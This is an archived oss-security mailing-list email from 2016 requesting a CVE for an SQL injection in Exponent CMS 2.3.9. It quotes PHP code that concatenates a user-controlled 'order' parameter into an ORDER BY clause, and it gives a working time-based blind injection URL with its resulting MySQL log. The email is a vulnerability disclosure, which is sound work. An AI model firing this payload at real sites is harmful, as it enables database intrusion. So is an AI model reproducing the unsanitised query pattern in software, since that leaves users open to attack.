X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3916" "Monday" "19" "September" "2016" "08:17:53" "-0400" "=?UTF-8?B?546L56a55ZOy?=" "0xtom4to@gmail.com" "<CAJ8RaNZJHLm59Hc5TZQOBX-DdohC1FG00YWd_yS56QmNHAggig@mail.gmail.com>" "117" "[oss-security] CVE request - Exponent CMS 2.3.9 SQL injection" nil nil nil "9" "2016091912:17:53" "[oss-security] CVE request - Exponent CMS 2.3.9 SQL injection" (number mark "U       0xtom4to@gma Sep 19  117/3916  " thread-indent "\"[oss-security] CVE request - Exponent CMS 2.3.9 SQL injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28147 invoked by uid 550); 19 Sep 2016 12:31:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22518 invoked from network); 19 Sep 2016 12:18:05 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=from:mime-version:date:message-id:subject:to:cc;
        bh=FvpaYATgB71c2yzSfXfoRVYI8hSA4ApCxXba8ZFRhbc=;
        b=Keh4RSkxJaznB7FZBLnuzkpNZ9BesQS+fdtQTUV/t9jpTzCEKilQGPql3hQJVhs7kL
         EVGbvNT3aC2m1KNfrzWqR1+Ce9T8dPbaSCx+hbVwK4iyt1PbtEXPzLeEcIfijcU0HhCS
         YpCLGEvj1XM/Blc+Q6VbK05R8sof0cVfInoPL1Y2wEB6gBXhtoIF9fTZGF4Szm/CR8r5
         Esu995tn9Nt3JafsomoRRkRcdekB1umPAc3zLJfraS0UGe9N7gpnCb2CZAkSSHVc+sUK
         dlVJ6xSVcdOZyxIm6tHuS4wguZdz8Qvow8v4xwN8yv0MxSlXjTUkDVMyRZMnD1adGqRD
         CUSQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:mime-version:date:message-id:subject:to:cc;
        bh=FvpaYATgB71c2yzSfXfoRVYI8hSA4ApCxXba8ZFRhbc=;
        b=MiqNJnYHS5/LfBTC6dxkbtz4ygI2NhUWR9b3Qq+6ngOfKcY/ezcktJ1CjdKMmySaiH
         2zYWcWC5fKF1xvUDKq0e/4bNJ51Z6sVt+nb2D2A8mUgnOh8lE9i2gJEc2smOS3agFESG
         23MKK8WB/5OPrzo8NP2ELilTdxY8VgLEevfb4API33TWNE1D8q3pEz9QCQvJlgPKQ6up
         VK+WSTJL8zhE5D6YdBd2cS51U9nyaqT8wutTt2LD8uUwepyESvqgDBIucGa2Yu5qmLQY
         USA7h0s7UNlizf7vgBumCKAVcygNRe4spuar1WlvRGTYfwuhcnL/I8JB+0O2hL/burGZ
         SbuA==
X-Gm-Message-State: AE9vXwPysgoIU0QKh342+yhkguh6Wlrxdxz7VZ1MKmsJeK/FMCb2Ixo8DeUODuaCiT6seB+QhNAlkmdoi10I4Q==
X-Received: by 10.66.47.67 with SMTP id b3mr46903599pan.43.1474287474090; Mon,
 19 Sep 2016 05:17:54 -0700 (PDT)
From: =?UTF-8?B?546L56a55ZOy?= <0xtom4to@gmail.com>
X-Mailer: Airmail (382)
MIME-Version: 1.0
Date: Mon, 19 Sep 2016 08:17:53 -0400
Message-ID: <CAJ8RaNZJHLm59Hc5TZQOBX-DdohC1FG00YWd_yS56QmNHAggig@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
Content-Type: multipart/alternative; boundary=bcaec544ec0430aa61053cdb4dd0
Subject: [oss-security] CVE request - Exponent CMS 2.3.9 SQL injection

--bcaec544ec0430aa61053cdb4dd0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Author: Tomato jianing.wang@chaitin.com

Data: 2016=E2=80=9309=E2=80=9319

Version: 2.3.9 and earlier

/exponent=E2=80=932.3.9/framework/core/subsystems/expPaginator.php


if (strstr($this->order," ")) {
            $orderby =3D explode(" ",$this->order);
            $this->order =3D $orderby[0];
            $this->order_direction =3D $orderby[1];
        }
        if ($this->dontsort)
            $sort =3D null;
        else
            $sort =3D $this->order.' '.$this->order_direction;

        // figure out how many records we're dealing with & grab the records
        //if (!empty($this->records)) { //from Merge <~~ this doesn't
work. Could be empty, but still need to hit.
        if (!empty($this->categorize))
            $limit =3D null;
        else
            $limit =3D $this->limit;

        if (isset($params['records'])) { // if we pass
$params['records'], we WANT to hit this
            // sort the records that were passed in to us
            if (!empty($sort))
                usort($this->records,array('expPaginator',
strtolower($this->order_direction)));
//          $this->total_records =3D count($this->records);
        } elseif (!empty($class)) { //where clause     //FJD: was
$this->class, but wasn't working...
            $this->total_records =3D $class->find('count', $this->where);
            $this->records =3D $class->find('all', $this->where, $sort,
$limit, $this->start);
        } elseif (!empty($this->where)) { //from Merge....where clause
            $this->total_records =3D $class->find('count', $this->where);
            $this->records =3D $class->find('all', $this->where, $sort,
$limit, $this->start);
        } else { //sql clause  //FIXME we don't get attachments in this app=
roach
            //$records =3D $db->selectObjectsBySql($this->sql);
            //$this->total_records =3D count($records);
            //this is MUCH faster if you supply a proper count_sql
param using a COUNT() function; if not,
            //we'll run the standard sql and do a queryRows with it
            //$this->total_records =3D $this->count_sql =3D=3D '' ?
$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
//From Merge

//          $this->total_records =3D
$db->countObjectsBySql($this->count_sql);
//$db->queryRows($this->sql); //From most current Trunk

            if (!empty($sort)) $this->sql .=3D ' ORDER BY '.$sort;


i can controller $order ,i can use this parameter to sql injection

such as

exponent=E2=80=932.3.9/framework/modules/company/controllers/companyControl=
ler.php


function showall() {
        expHistory::set('viewable', $this->params);
        $page =3D new expPaginator(array(
            'model'=3D>$this->basemodel_name,
            'where'=3D>1,
            'limit'=3D>(isset($this->params['limit']) &&
$this->config['limit'] !=3D '') ? $this->params['limit'] : 10,
            'order'=3D>isset($this->params['order']) ?
$this->params['order'] : 'rank',
            'page'=3D>(isset($this->params['page']) ? $this->params['page']=
 : 1),
            'controller'=3D>$this->baseclassname,
            'action'=3D>$this->params['action'],
            'columns'=3D>array(
                gt('Manufacturer')=3D>'title',
                gt('Website')=3D>'website'
            ),
        ));

        assign_to_template(array(
            'page'=3D>$page,
            'items'=3D>$page->records
        ));
    }


the poc is

http://127.0.0.1/exponent-2.3.9/index.php?controller=3Dcompany&action=3Dsho=
wall&limit=3D1&order=3D(select/**/*/**/from/**/(select/**/sleep(5))x)%23

in the mysql log we can see this

SELECT * FROM exponent_companies WHERE 1 ORDER BY
(select/**/*/*/from/*/(select/**/sleep(5))x)#
ASC LIMIT 0,10

Could you assign CVE id for this?

Regards,

Tomato

--bcaec544ec0430aa61053cdb4dd0--
